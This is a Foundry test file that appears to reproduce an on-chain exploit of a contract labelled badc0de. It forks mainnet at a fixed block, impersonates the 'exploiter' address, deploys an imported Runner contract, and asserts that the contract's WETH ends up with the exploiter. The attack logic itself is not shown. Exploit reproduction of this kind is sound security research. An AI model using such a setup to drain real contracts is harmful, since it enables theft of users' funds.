// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/IERC20.sol";
import "../src/Runner.sol";

contract RunTest is Test {
    IERC20 constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant badc0de = 0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A;
    address constant badc0deLogic = 0xDd6Bd08c29fF3EF8780bF6A10D8b620A93AC5705;

    address constant exploiter = 0xB9F78307DEd12112c1f09C16009e03eF4ef16612;

    function setUp() public {
        vm.label(address(weth), "WETH");
        vm.label(badc0de, "badc0de");
        vm.label(badc0deLogic, "badc0deLogic");
        vm.label(exploiter, "exploiter");

        vm.createSelectFork(
            "mainnet",
            15625424 // block number of tx 0x59ddcf5ee5c687af2cbf291c3ac63bf28316a8ecbb621d9f62d07fa8a5b8ef4e
        );
    }

    function testRun() public {
        uint256 initialBadc0deWETHBalance = weth.balanceOf(badc0de);
        console.log("Initial badc0de WETH balance: %d", weth.balanceOf(badc0de));

        uint256 initialExploiterETHBalance = exploiter.balance;

        vm.prank(exploiter);
        new Runner();

        console.log("Final badc0de WETH balance: %d", weth.balanceOf(badc0de));
        assertEq(weth.balanceOf(badc0de), 0);

        console.log("Final exploiter ETH balance: %d", exploiter.balance);
        assertEq(exploiter.balance, initialExploiterETHBalance + initialBadc0deWETHBalance);
    }
}
